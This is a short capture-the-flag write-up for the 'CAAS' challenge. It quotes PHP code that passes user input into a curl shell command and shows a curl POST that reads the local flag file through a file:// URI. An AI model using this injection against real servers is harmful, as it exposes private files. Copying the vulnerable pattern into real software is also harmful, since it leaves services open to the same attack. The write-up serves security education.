# Caas

## Challenge

```plain
cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites.
However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.
```

This challenge comes with a Dockerfile and the source for the site.

## Solution

Running the container and looking a bit inside the source yields the following:

1. The website doesn't work (at least I never got it to work)
2. There is another endpoint `/api/curl`

### The custom endpoint

The following code will call `CurlController@execute`

```php
$router->new('POST', '/api/curl', 'CurlController@execute' );
```

Looking at `CurlController@execute` will tell us that the `ip` value from a
`POST` request will be handled to `$command->exec()`

```php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
}
```

exec will take the user input, sanitize it for known shellcode and then run it.

Well... curl can take `file://` URIs... so:

```bash
curl -X POST -d "ip=file:///flag" -H "Content-Type:application/x-www-form-urlencoded" http://127.0.0.1:1337/api/curl
```
